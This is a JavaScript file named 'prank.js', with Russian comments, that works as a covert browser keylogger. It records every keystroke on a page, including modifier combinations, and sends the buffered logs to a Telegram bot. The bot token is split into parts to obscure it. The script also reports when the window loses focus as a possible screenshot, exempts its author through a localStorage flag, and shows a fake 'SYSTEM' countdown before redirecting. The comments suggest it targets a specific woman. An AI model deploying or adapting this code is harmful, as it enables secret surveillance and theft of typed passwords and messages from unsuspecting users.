// prank.js
(function() {
    if (localStorage.getItem('is_sultan') === 'true' || window.location.search.includes('me')) return;

    function sendTelegram(text) {
        const part1 = "8818384063:";
        const part2 = "AAEEqTup6sgED-gYB_1tm";
        const part3 = "cQKcXwi-UDE3lQ";
        const BOT_TOKEN = part1 + part2 + part3;
        const CHAT_ID = "606061445";
        // Отправляем без ожидания ответа, чтобы не тормозить браузер
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=HTML`).catch(() => {});
    }

    // --- ПОЛНЫЙ КЕЙЛОГГЕР ---
    let keyBuffer = "";
    let sendTimer = null;

    function flushKeys() {
        if (keyBuffer.length === 0) return;
        const pageName = window.location.pathname.split('/').pop() || 'index.html';
        sendTelegram(`⌨️ <b>Ввод на странице</b> (${pageName}):\n\n<code>${keyBuffer}</code>`);
        keyBuffer = "";
    }

    document.addEventListener('keydown', function(event) {
        let key = event.key;

        // Красиво форматируем спецклавиши
        if (key === ' ') key = '␣';
        else if (key === 'Enter') key = '\n[Enter]\n';
        else if (key === 'Backspace') key = '⌫';
        else if (key === 'Tab') key = '[Tab]';
        else if (key === 'Shift' || key === 'Control' || key === 'Alt' || key === 'Meta') return; 
        else if (key.length > 1) key = `[${key}]`;

        // Добавляем модификаторы, если они зажаты
        if (event.ctrlKey) key = `[Ctrl+${key}]`;
        if (event.shiftKey && key.length === 1) key = `[Shift+${key}]`; // Для комбинаций с буквами
        if (event.altKey) key = `[Alt+${key}]`;
        if (event.metaKey) key = `[Win+${key}]`;

        keyBuffer += key;

        // Сбрасываем таймер — отправляем через 3 секунды после последнего нажатия
        // 3 секунды достаточно, чтобы браузер не завис, но и ты быстро получил лог
        clearTimeout(sendTimer);
        sendTimer = setTimeout(flushKeys, 3000); 

        // Если накопилось больше 300 символов — отправляем сразу
        if (keyBuffer.length > 300) {
            clearTimeout(sendTimer);
            flushKeys();
        }
    });

    // Отправляем остатки, если она уходит со страницы
    window.addEventListener('beforeunload', flushKeys);

    // --- ФОЛБЭК: ОТСЛЕЖИВАНИЕ ПОТЕРИ ФОКУСА (сработает, если винда перехватит хоткей) ---
    let blurStartTime = 0;
    window.addEventListener('blur', () => blurStartTime = Date.now());
    window.addEventListener('focus', function() {
        if (blurStartTime > 0) {
            let timeAway = (Date.now() - blurStartTime) / 1000;
            blurStartTime = 0;
            if (timeAway > 1 && timeAway < 10) {
                sendTelegram(`✂️ <b>Возможно, скриншот!</b>\n\nОкно теряло фокус на ${Math.round(timeAway)} сек.\nСтраница: ${window.location.pathname.split('/').pop()}`);
            }
        }
    });

    // --- ЛОГИКА ТАЙМЕРА ---
    window.addEventListener('DOMContentLoaded', () => {
        const timerBox = document.createElement('div');
        timerBox.style.cssText = `
            position: fixed; bottom: 20px; right: 20px;
            background: rgba(20, 10, 15, 0.6); backdrop-filter: blur(5px);
            border: 1px solid rgba(255, 71, 87, 0.4); color: rgba(255, 255, 255, 0.8);
            padding: 10px 16px; border-radius: 12px; font-family: 'Courier New', monospace;
            font-size: 14px; font-weight: bold; z-index: 999999; pointer-events: none;
            box-shadow: 0 4px 15px rgba(0,0,0,0.5); text-align: center; transition: 0.3s;
        `;
        
        timerBox.innerHTML = `
            <div style="font-size: 10px; color: #ff4757; letter-spacing: 1px; margin-bottom: 4px;">СИСТЕМА</div>
            Возврат через: <span id="prankTimer" style="color: #ff4757; font-size: 18px;">3</span> с
        `; 
        
        document.body.appendChild(timerBox);

        let timeLeft = 3;
        const timerSpan = document.getElementById('prankTimer');
        const countdown = setInterval(() => {
            timeLeft--;
            if (timeLeft >= 0 && timerSpan) {
                timerSpan.textContent = timeLeft;
                if (timeLeft <= 3) {
                    timerBox.style.borderColor = '#ff0000';
                    timerBox.style.background = 'rgba(50, 5, 5, 0.8)';
                }
            }
            if (timeLeft < 0) {
                clearInterval(countdown);
                flushKeys();
                setTimeout(() => window.location.href = 'index.html?error=1', 500);
            }
        }, 1000); 
    });
})();